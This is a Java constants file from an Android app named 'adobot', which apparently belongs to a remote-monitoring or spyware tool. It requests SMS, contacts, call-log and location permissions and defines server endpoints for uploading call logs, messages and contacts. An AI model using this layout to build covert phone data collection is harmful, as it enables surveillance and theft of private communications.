package com.android.adobot;

import android.Manifest;

/**
 * Created by adones on 2/26/17.
 */

public final class Constants {

    public static final String PACKAGE_NAME = "com.android.adobot";
    public static final String UPDATE_PKG_FILE_NAME = "update.apk";

    public static final String[] PERMISSIONS = {
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
    };

    public static final String PREF_SERVER_URL_FIELD = "serverUrl";
    public static final String DEVELOPMENT_SERVER = "http://192.168.1.251:3000";
    public static final String NOTIFY_URL = "/notify";
    public static final String POST_CALL_LOGS_URL = "/call-logs";
    public static final String POST_MESSAGE_URL = "/message";
    public static final String POST_CONTACTS_URL = "/contacts";
    public static final String POST_STATUS_URL = "/status";



}
